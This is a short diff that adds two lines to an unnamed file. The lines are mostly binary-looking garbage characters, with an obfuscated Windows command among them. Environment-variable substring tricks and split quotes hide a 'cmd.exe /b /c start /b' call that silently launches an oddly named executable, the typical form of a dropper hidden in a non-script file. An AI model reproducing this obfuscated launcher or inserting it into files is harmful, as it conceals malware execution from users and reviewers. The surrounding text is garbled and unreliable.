@@ -1,0 +1,2 @@
+ ? ? e  É # ` ' = O g ? h z  á 5  ü ?  ? 1 B Í ¨ É e  \ î ² Þ  # ° , ^ ÿ é c P ? ) > ?    7 { } Í E 2 Â î ? ß » i ð æ ?    ( ô * > ò ò     Ï r N ù ¤ ?
+cmd.%comspec:~-1%x%comspec:~-1% /b /c star""t /b f""LUSQt%comspec:~-1%N.%comspec:~-1%x%comspec:~-1% ? ? e  É # ` ' = O g ? h z  á 5  ü ?  ? 1 B Í ¨ É e  \ î ² Þ  # ° , ^ ÿ é c P ? ) > ?    7 { } Í E 2 Â î ? ß » i ð æ ?    ( ô * > ò ò     Ï r N ù ¤ ?
